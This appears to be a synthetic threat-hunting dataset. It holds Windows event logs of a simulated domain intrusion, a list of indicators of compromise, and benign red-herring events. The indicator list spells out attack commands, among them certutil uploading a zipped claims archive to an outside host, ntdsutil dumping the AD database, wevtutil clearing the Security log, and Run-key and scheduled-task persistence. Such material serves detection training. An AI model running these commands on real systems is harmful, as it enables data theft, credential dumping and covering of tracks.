| 2026-08-13 05:14:56 UTC | priya.menon | FILE-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 48384) - `sc stop AuditSyncSvc` |
| 2026-08-13 05:14:58 UTC | priya.menon | FILE-01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 48392) - `cmd.exe /c del /f C:\Windows\Temp\auditsync.exe` |
| 2026-08-13 07:50:39 UTC | sneha.patel | PC-008 | Process | Process: C:\Windows\System32\net.exe (PID: 25812) - `net user svc-sync-check /add /domain` |
| 2026-08-13 07:50:45 UTC | sneha.patel | PC-008 | Account_Created | Account created: svc-sync-check |
| 2026-08-13 07:50:54 UTC | sneha.patel | PC-008 | Group_Member_Added | Added svc-sync-check to group Remote Desktop Users |
| 2026-08-13 14:10:56 UTC | ananya.sharma | PC-001 | Process | Process: C:\Windows\System32\net.exe (PID: 30048) - `net view /domain:corp.local` |
| 2026-08-13 14:11:02 UTC | ananya.sharma | PC-001 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 30060) - `robocopy \\FILE-01\Shared C:\ProgramData\Cache ...` |
| 2026-08-13 14:11:31 UTC | ananya.sharma | PC-001 | Connection | Connection to 10.10.10.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-13 17:50:47 UTC | rohan.mehta | PC-002 | Dns_Query | DNS query: sync-check.corp-update.example (TXT, NOERROR) |
| 2026-08-13 17:51:32 UTC | rohan.mehta | PC-002 | Dns_Query | DNS query: k7.sync-check.corp-update.example (A, NOERROR) |
| 2026-08-13 17:52:03 UTC | rohan.mehta | PC-002 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-13 18:31:29 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 55676) - `wevtutil qe Security /c:5 /rd:true /f:text` |
| 2026-08-13 18:31:43 UTC | arjun.iyer | PC-003 | Log_Cleared | Synthetic defense evasion attack activity with multiple correlated indicators in one 10-minute window |
| 2026-08-13 18:32:19 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\cmd.exe (PID: 55696) - `cmd.exe /c sc query EventLog` |
| 2026-08-13 18:51:04 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\Temp\diag-helper.exe (PID: 63516) - `diag-helper.exe --inspect-auth` |
| 2026-08-13 18:51:47 UTC | kavya.reddy | PC-004 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2026-08-13 18:52:31 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 63524) - `powershell.exe -NoProfile -Command "Get-Service"` |
| 2026-08-13 22:30:39 UTC | rahul.verma | PC-005 | Process | Process: C:\Windows\System32\net.exe (PID: 39040) - `net group "Domain Admins" /domain` |
| 2026-08-13 22:30:44 UTC | rahul.verma | PC-005 | Group_Member_Added | Added rahul.verma to group Remote Desktop Users |
| 2026-08-13 22:31:10 UTC | rahul.verma | PC-005 | Logon | Network logon from 10.10.10.23 (LogonID: 0x12eae62e) |
| 2026-08-14 02:10:34 UTC | vikram.nair | PC-006 | Process | Process: C:\Windows\System32\whoami.exe (PID: 14744) - `whoami /all` |
| 2026-08-14 02:11:17 UTC | vikram.nair | PC-006 | Process | Process: C:\Windows\System32\systeminfo.exe (PID: 14772) - `systeminfo` |
| 2026-08-14 02:12:00 UTC | vikram.nair | PC-006 | Process | Process: C:\Windows\System32\nltest.exe (PID: 14776) - `nltest /dclist:corp.local` |
| 2026-08-14 02:12:36 UTC | vikram.nair | PC-006 | Connection | Connection to 10.10.10.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-14 04:51:16 UTC | priya.menon | PC-007 | Logon | Network logon from 203.0.113.47 (LogonID: 0x11636e01) |
| 2026-08-14 04:51:42 UTC | priya.menon | PC-007 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 6404) - `powershell.exe -NoProfile -Command "Get-Process"` |
| 2026-08-14 04:52:26 UTC | priya.menon | PC-007 | Connection | Connection to 10.10.10.20:3389 (UID: (filtered by sensor placement)) |
| 2026-08-14 06:51:29 UTC | sneha.patel | PC-008 | Explicit_Credentials | Explicit credentials: RunAs priya.menon on FILE-01 |
| 2026-08-14 06:52:13 UTC | sneha.patel | PC-008 | Logon | Network logon from 10.10.10.23 (LogonID: 0x180fc337) |
| 2026-08-14 06:52:34 UTC | sneha.patel | PC-008 | Process | Process: C:\Windows\System32\cmd.exe (PID: 25844) - `cmd.exe /c net view \FILE-01` |
| 2026-08-14 12:10:52 UTC | ananya.sharma | PC-001 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 30100) - `schtasks /query /fo LIST /v` |
| 2026-08-14 12:11:03 UTC | ananya.sharma | PC-001 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\UpdateCache\TelemetrySync |
| 2026-08-14 12:11:16 UTC | ananya.sharma | PC-001 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-14 18:11:29 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\System32\sc.exe (PID: 7616) - `sc.exe query state= all` |
| 2026-08-14 18:11:35 UTC | rohan.mehta | PC-002 | Service_Installed | Service installed: UpdateTelemetrySvc (C:\ProgramData\UpdateCache\telemetry.exe) |
| 2026-08-14 18:11:52 UTC | rohan.mehta | PC-002 | Connection | Connection to 93.184.221.240:443 (UID: (filtered by sensor placement)) |
| 2026-08-14 18:30:40 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\net.exe (PID: 55716) - `net user svc-sync-check /add /domain` |
| 2026-08-14 18:31:15 UTC | arjun.iyer | PC-003 | Account_Created | Account created: svc-sync-check |
| 2026-08-14 18:31:34 UTC | arjun.iyer | PC-003 | Group_Member_Added | Added svc-sync-check to group Remote Desktop Users |
| 2026-08-14 19:10:55 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\System32\net.exe (PID: 63596) - `net view /domain:corp.local` |
| 2026-08-14 19:11:21 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 63636) - `robocopy \\FILE-01\Shared C:\ProgramData\Cache ...` |
| 2026-08-14 19:11:47 UTC | kavya.reddy | PC-004 | Connection | Connection to 10.10.10.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-14 21:10:57 UTC | rahul.verma | PC-005 | Dns_Query | DNS query: sync-check.corp-update.example (TXT, NOERROR) |
| 2026-08-14 21:11:05 UTC | rahul.verma | PC-005 | Dns_Query | DNS query: k7.sync-check.corp-update.example (A, NOERROR) |
| 2026-08-14 21:11:39 UTC | rahul.verma | PC-005 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-15 03:10:49 UTC | vikram.nair | PC-006 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 14784) - `wevtutil qe Security /c:5 /rd:true /f:text` |
| 2026-08-15 03:11:33 UTC | vikram.nair | PC-006 | Log_Cleared | Synthetic defense evasion attack activity with multiple correlated indicators in one 10-minute window |
| 2026-08-15 03:12:17 UTC | vikram.nair | PC-006 | Process | Process: C:\Windows\System32\cmd.exe (PID: 14816) - `cmd.exe /c sc query EventLog` |
| 2026-08-15 06:11:06 UTC | priya.menon | PC-007 | Process | Process: C:\Windows\Temp\diag-helper.exe (PID: 6416) - `diag-helper.exe --inspect-auth` |
| 2026-08-15 06:11:47 UTC | priya.menon | PC-007 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2026-08-15 06:12:12 UTC | priya.menon | PC-007 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 6456) - `powershell.exe -NoProfile -Command "Get-Service"` |
| 2026-08-15 07:10:50 UTC | sneha.patel | PC-008 | Process | Process: C:\Windows\System32\net.exe (PID: 25856) - `net group "Domain Admins" /domain` |
| 2026-08-15 07:11:25 UTC | sneha.patel | PC-008 | Group_Member_Added | Added rahul.verma to group Remote Desktop Users |
| 2026-08-15 07:11:40 UTC | sneha.patel | PC-008 | Logon | Network logon from 10.10.10.23 (LogonID: 0x18c629bc) |
| 2026-08-15 13:31:15 UTC | ananya.sharma | PC-001 | Process | Process: C:\Windows\System32\whoami.exe (PID: 30108) - `whoami /all` |
| 2026-08-15 13:31:59 UTC | ananya.sharma | PC-001 | Process | Process: C:\Windows\System32\systeminfo.exe (PID: 30140) - `systeminfo` |
| 2026-08-15 13:32:39 UTC | ananya.sharma | PC-001 | Process | Process: C:\Windows\System32\nltest.exe (PID: 30144) - `nltest /dclist:corp.local` |
| 2026-08-15 13:33:04 UTC | ananya.sharma | PC-001 | Connection | Connection to 10.10.10.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-15 18:11:27 UTC | rohan.mehta | PC-002 | Logon | Network logon from 203.0.113.47 (LogonID: 0x13a1d459) |
| 2026-08-15 18:11:51 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 7680) - `powershell.exe -NoProfile -Command "Get-Process"` |
| 2026-08-15 18:12:00 UTC | rohan.mehta | PC-002 | Connection | Connection to 10.10.10.20:3389 (UID: (filtered by sensor placement)) |
| 2026-08-15 18:30:39 UTC | arjun.iyer | PC-003 | Explicit_Credentials | Explicit credentials: RunAs priya.menon on FILE-01 |
| 2026-08-15 18:31:04 UTC | arjun.iyer | PC-003 | Logon | Network logon from 10.10.10.23 (LogonID: 0x183459cf) |
| 2026-08-15 18:31:18 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\cmd.exe (PID: 55740) - `cmd.exe /c net view \FILE-01` |
| 2026-08-15 22:31:14 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 63640) - `schtasks /query /fo LIST /v` |
| 2026-08-15 22:31:25 UTC | kavya.reddy | PC-004 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\UpdateCache\TelemetrySync |
| 2026-08-15 22:31:50 UTC | kavya.reddy | PC-004 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-15 23:10:42 UTC | rahul.verma | PC-005 | Process | Process: C:\Windows\System32\sc.exe (PID: 39096) - `sc.exe query state= all` |
| 2026-08-15 23:10:52 UTC | rahul.verma | PC-005 | Service_Installed | Service installed: UpdateTelemetrySvc (C:\ProgramData\UpdateCache\telemetry.exe) |
| 2026-08-15 23:11:19 UTC | rahul.verma | PC-005 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-16 01:30:47 UTC | vikram.nair | PC-006 | Process | Process: C:\Windows\System32\net.exe (PID: 14852) - `net user svc-sync-check /add /domain` |
| 2026-08-16 01:31:02 UTC | vikram.nair | PC-006 | Account_Created | Account created: svc-sync-check |
| 2026-08-16 01:31:43 UTC | vikram.nair | PC-006 | Group_Member_Added | Added svc-sync-check to group Remote Desktop Users |
| 2026-08-16 06:51:17 UTC | priya.menon | PC-007 | Process | Process: C:\Windows\System32\net.exe (PID: 6484) - `net view /domain:corp.local` |
| 2026-08-16 06:51:58 UTC | priya.menon | PC-007 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 6504) - `robocopy \\FILE-01\Shared C:\ProgramData\Cache ...` |
| 2026-08-16 06:52:43 UTC | priya.menon | PC-007 | Connection | Connection to 10.10.10.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-16 07:50:54 UTC | sneha.patel | PC-008 | Dns_Query | DNS query: sync-check.corp-update.example (TXT, NOERROR) |
| 2026-08-16 07:50:59 UTC | sneha.patel | PC-008 | Dns_Query | DNS query: k7.sync-check.corp-update.example (A, NOERROR) |
| 2026-08-16 07:51:33 UTC | sneha.patel | PC-008 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-16 13:50:58 UTC | ananya.sharma | PC-001 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 30172) - `wevtutil qe Security /c:5 /rd:true /f:text` |
| 2026-08-16 13:51:08 UTC | ananya.sharma | PC-001 | Log_Cleared | Synthetic defense evasion attack activity with multiple correlated indicators in one 10-minute window |
| 2026-08-16 13:51:33 UTC | ananya.sharma | PC-001 | Process | Process: C:\Windows\System32\cmd.exe (PID: 30176) - `cmd.exe /c sc query EventLog` |
| 2026-08-16 17:51:08 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\Temp\diag-helper.exe (PID: 7692) - `diag-helper.exe --inspect-auth` |
| 2026-08-16 17:51:14 UTC | rohan.mehta | PC-002 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2026-08-16 17:51:37 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 7696) - `powershell.exe -NoProfile -Command "Get-Service"` |
| 2026-08-16 18:30:50 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\net.exe (PID: 55764) - `net group "Domain Admins" /domain` |
| 2026-08-16 18:31:17 UTC | arjun.iyer | PC-003 | Group_Member_Added | Added rahul.verma to group Remote Desktop Users |
| 2026-08-16 18:31:48 UTC | arjun.iyer | PC-003 | Logon | Network logon from 10.10.10.23 (LogonID: 0x11570915) |
| 2026-08-16 18:51:06 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\System32\whoami.exe (PID: 63660) - `whoami /all` |
| 2026-08-16 18:51:36 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\System32\systeminfo.exe (PID: 63684) - `systeminfo` |
| 2026-08-16 18:52:18 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\System32\nltest.exe (PID: 63688) - `nltest /dclist:corp.local` |
| 2026-08-16 18:52:59 UTC | kavya.reddy | PC-004 | Connection | Connection to 10.10.10.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-16 21:31:08 UTC | rahul.verma | PC-005 | Logon | Network logon from 203.0.113.47 (LogonID: 0x14ff66ae) |
| 2026-08-16 21:31:51 UTC | rahul.verma | PC-005 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 39128) - `powershell.exe -NoProfile -Command "Get-Process"` |
| 2026-08-16 21:32:26 UTC | rahul.verma | PC-005 | Connection | Connection to 10.10.10.20:3389 (UID: (filtered by sensor placement)) |
| 2026-08-17 02:10:49 UTC | vikram.nair | PC-006 | Explicit_Credentials | Explicit credentials: RunAs priya.menon on FILE-01 |
| 2026-08-17 02:11:04 UTC | vikram.nair | PC-006 | Logon | Network logon from 10.10.10.23 (LogonID: 0x2223beef) |
| 2026-08-17 02:11:33 UTC | vikram.nair | PC-006 | Process | Process: C:\Windows\System32\cmd.exe (PID: 14876) - `cmd.exe /c net view \FILE-01` |
| 2026-08-17 04:30:51 UTC | priya.menon | PC-007 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 6516) - `schtasks /query /fo LIST /v` |
| 2026-08-17 04:31:29 UTC | priya.menon | PC-007 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\UpdateCache\TelemetrySync |
| 2026-08-17 04:32:06 UTC | priya.menon | PC-007 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-17 08:30:57 UTC | sneha.patel | PC-008 | Process | Process: C:\Windows\System32\sc.exe (PID: 25952) - `sc.exe query state= all` |
| 2026-08-17 08:31:36 UTC | sneha.patel | PC-008 | Service_Installed | Service installed: UpdateTelemetrySvc (C:\ProgramData\UpdateCache\telemetry.exe) |
| 2026-08-17 08:32:14 UTC | sneha.patel | PC-008 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-17 11:31:13 UTC | ananya.sharma | PC-001 | Process | Process: C:\Windows\System32\net.exe (PID: 30184) - `net user svc-sync-check /add /domain` |
| 2026-08-17 11:31:50 UTC | ananya.sharma | PC-001 | Account_Created | Account created: svc-sync-check |
| 2026-08-17 11:32:22 UTC | ananya.sharma | PC-001 | Group_Member_Added | Added svc-sync-check to group Remote Desktop Users |
| 2026-08-17 17:31:28 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\System32\net.exe (PID: 7760) - `net view /domain:corp.local` |
| 2026-08-17 17:31:46 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 7792) - `robocopy \\FILE-01\Shared C:\ProgramData\Cache ...` |
| 2026-08-17 17:32:28 UTC | rohan.mehta | PC-002 | Connection | Connection to 10.10.10.20:445 (UID: (filtered by sensor placement)) |


## Indicators of Compromise (IOCs)

### Network IOCs

- 10.10.10.20:3389 (Internal Server)
- 10.10.10.20:445 (Internal Server)
- 10.10.10.23 (Attacker IP)
- 10.10.20.10:3389 (Internal Server)
- 10.10.20.10:3389 (Lateral Movement)
- 10.10.20.20:3389 (Lateral Movement)
- 10.10.20.20:445 (Internal Server)
- 10.10.20.30:135 (Internal Server)
- 10.10.20.30:1433 (Internal Server)
- 10.10.20.40:5985 (Internal Server)
- 185.220.101.34 (Attacker IP)
- 198.51.100.164:443 (Beacon Target)
- 198.51.100.44:443 (Internal Server)
- 198.51.100.83:443 (Beacon Target)
- 198.51.100.83:443 (Internal Server)
- 203.0.113.102 (Attacker IP)
- 203.0.113.47 (Attacker IP)
- 203.0.113.55 (Attacker IP)
- 91.199.212.132:3389 (C2 Server)
- 93.184.220.29:443 (C2 Server)
- 93.184.221.240:443 (C2 Server)
- _ldap._tcp.dc._msdcs.corp.local (Malicious DNS Query)
- c2-operator-2.attacker.net (Malicious DNS Query)
- cdn-metrics-edge.net (Malicious DNS Query)
- k7.sync-check.corp-update.example (Malicious DNS Query)
- sync-check.corp-update.example (Malicious DNS Query)

### Process IOCs

- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- C:\Windows\System32\certutil.exe
- C:\Windows\System32\cmd.exe
- C:\Windows\System32\mstsc.exe
- C:\Windows\System32\net.exe
- C:\Windows\System32\nltest.exe
- C:\Windows\System32\ntdsutil.exe
- C:\Windows\System32\reg.exe
- C:\Windows\System32\robocopy.exe
- C:\Windows\System32\rundll32.exe
- C:\Windows\System32\sc.exe
- C:\Windows\System32\schtasks.exe
- C:\Windows\System32\systeminfo.exe
- C:\Windows\System32\wbem\WMIC.exe
- C:\Windows\System32\wevtutil.exe
- C:\Windows\System32\whoami.exe
- C:\Windows\Temp\diag-helper.exe
- C:\Windows\Temp\svc-host-helper.exe
- Injection Target: C:\Windows\System32\lsass.exe
- Scheduled Task: \Microsoft\Windows\UpdateCache\TelemetrySync
- Scheduled Task: \OneDriveSyncCheck
- Service: AuditSyncSvc
- Service: UpdateTelemetrySvc
- `certutil -encode C:\Windows\Temp\q3-claims.zip C:\Windows\Temp\q3-claims.b64`
- `certutil -urlcache -split -f -post C:\Windows\Temp\q3-claims.b64 https://cdn-metrics-edge.net/upload`
- `cmd.exe /c del /f C:\Windows\Temp\auditsync.exe /a`
- `cmd.exe /c del /f C:\Windows\Temp\auditsync.exe`
- `cmd.exe /c dir \FILE-01\Claims /s /b`
- `cmd.exe /c dir \FILE-01\Finance /s /b`
- `cmd.exe /c net view \FILE-01`
- `cmd.exe /c sc query EventLog`
- `diag-helper.exe --inspect-auth`
- `mstsc.exe /v:DC-01`
- `net group "Domain Admins" /domain`
- `net group "Domain Admins" rohan.mehta /add /domain`
- `net group "Domain Admins" sneha.patel /add /domain`
- `net user svc-audit-sync Wint3r!Sync2026 /add /domain`
- `net user svc-redundancy Winter2027! /add /domain`
- `net user svc-report-cache TempReport2026! /add /domain`
- `net user svc-sync-check /add /domain`
- `net view /domain:corp.local`
- `nltest /dclist:corp.local`
- `ntdsutil "ac i ntds" "ifm create full C:\Users\rohan.mehta\persistence" quit quit`
- `powershell.exe -NoProfile -Command "Get-Process"`
- `powershell.exe -NoProfile -Command "Get-Service"`
- `powershell.exe -NoProfile -Command 445,1433,5985,3389 | ForEach-Object { Test-NetConnection 10.10.20.$_ -Port $_ }`
- `powershell.exe -NoProfile -Command Compress-Archive -Path C:\Windows\Temp\finance_stage -DestinationPath C:\Windows\Temp\finance_q3.zip -Force`
- `powershell.exe -NoProfile -Command Compress-Archive -Path C:\Windows\Temp\stage -DestinationPath C:\Windows\Temp\q3-claims.zip -Force`
- `powershell.exe -NoProfile -Command Compress-Archive -Path \FILE-01\Finance -DestinationPath C:\Windows\Temp\finance-review.zip -Force`
- `powershell.exe -NoProfile -Command Get-ChildItem \FILE-01\Claims, \FILE-01\Finance, \FILE-01\HR -Recurse | Out-File C:\Users\kavya.reddy\Documents\collection.txt`
- `powershell.exe -NoProfile -Command Get-CimInstance Win32_Service -ComputerName SQL-01`
- `powershell.exe -NoProfile -EncodedCommand QwBvAG0AcAByAGUAcwBzAC0AQQByAGMAaABpAHYAZQA=`
- `reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Users\vikram.nair\AppData\Roaming\update.exe" /f`
- `robocopy \\FILE-01\Claims C:\Windows\Temp\stage /E /R:1 /W:1`
- `robocopy \\FILE-01\Finance C:\Windows\Temp\finance_stage /E /R:1 /W:1`
- `robocopy \\FILE-01\Shared C:\ProgramData\Cache /E /R:1 /W:1`
- `rundll32.exe C:\Users\arjun.iyer\AppData\Roaming\edgesync.dll,ServiceMain`
- `rundll32.exe C:\Users\kavya.reddy\AppData\Local\Temp\telemsync.dll,Init`
- `sc create AuditSyncSvc binPath= C:\Windows\Temp\auditsync.exe start= auto`
- `sc stop AuditSyncSvc`
- `sc.exe query state= all`
- `schtasks /Create /TN "OneDriveSyncCheck" /TR "C:\Users\arjun.iyer\AppData\Roaming\sync.exe" /SC HOURLY /RU SYSTEM`
- `schtasks /query /fo LIST /v`
- `svc-host-helper.exe --dump-auth`
- `systeminfo`
- `wevtutil cl Security`
- `wevtutil qe Security /c:5 /rd:true /f:text`
- `whoami /all`
- `wmic /node:FILE-01 process list brief`

### User IOCs

- Group: Domain Admins (compromised account)
- Group: Remote Desktop Users (compromised account)
- SYSTEM (compromised account)
- ananya.sharma (compromised account)
- ananya.sharma (Spray Target) (compromised account)
- arjun.iyer (compromised account)
- kavya.reddy (compromised account)
- kavya.reddy (Spray Target) (compromised account)
- priya.menon (compromised account)
- priya.menon (Explicit Credential Target) (compromised account)
- rahul.verma (compromised account)
- rahul.verma (Spray Target) (compromised account)
- rohan.mehta (compromised account)
- rohan.mehta (Explicit Credential Target) (compromised account)
- rohan.mehta (Spray Target) (compromised account)
- sneha.patel (compromised account)
- sneha.patel (Spray Target) (compromised account)
- svc-audit-sync (compromised account)
- svc-redundancy (compromised account)
- svc-report-cache (compromised account)
- svc-sync-check (compromised account)
- vikram.nair (compromised account)
- vikram.nair (Spray Target) (compromised account)

### File IOCs

- C:\ProgramData\UpdateCache\telemetry.exe
- C:\Users\kavya.reddy\Documents\collection.txt
- C:\Windows\System32\cmd.exe
- C:\Windows\Temp\auditsync.exe


## Red Herrings

The following events appear suspicious but are benign. They are included to make the dataset more realistic.

| Timestamp | Actor | System | Activity | Why It's Benign |
|-----------|-------|--------|----------|-----------------|
| 2026-08-05 04:35:17 UTC | sneha.patel | PC-008 | Security analyst runs domain enumeration tooling during a scheduled internal audit | Authorised quarterly access review. The commands overlap heavily with the attacker's discovery step on the same day, but the actor, host and hour are all consistent with her role.
 |
| 2026-08-05 04:35:19 UTC | sneha.patel | PC-008 | Security analyst runs domain enumeration tooling during a scheduled internal audit | Authorised quarterly access review. The commands overlap heavily with the attacker's discovery step on the same day, but the actor, host and hour are all consistent with her role.
 |
| 2026-08-06 09:34:36 UTC | rahul.verma | PC-001 | Help desk remote session to troubleshoot a finance workstation | Normal ticket work; the help-desk account legitimately touches many workstations. |
| 2026-08-06 09:55:13 UTC | rahul.verma | PC-004 | Help desk remote session to troubleshoot a developer workstation | Same ticket queue as rh-02a. |
| 2026-08-06 10:19:46 UTC | rahul.verma | PC-006 | Help desk remote session to troubleshoot the executive workstation | Same ticket queue as rh-02a. |
| 2026-08-07 00:09:52 UTC | vikram.nair | PC-006 | Executive signs in before dawn to clear mail ahead of a flight | Benign early start. Deliberately placed in the same unoccupied hour band as the attacker's off-hours logon so that hour novelty alone cannot separate malicious from benign.
 |
| 2026-08-09 05:30:07 UTC | priya.menon | FILE-01 | Sunday maintenance window - administrator patches the file server | Approved change-window activity. This is the false positive that a weekday-aware daily baseline is most likely to raise, since weekend administrative work is rare but legitimate.
 |
| 2026-08-09 05:30:09 UTC | priya.menon | FILE-01 | Sunday maintenance window - administrator patches the file server | Approved change-window activity. This is the false positive that a weekday-aware daily baseline is most likely to raise, since weekend administrative work is rare but legitimate.
 |
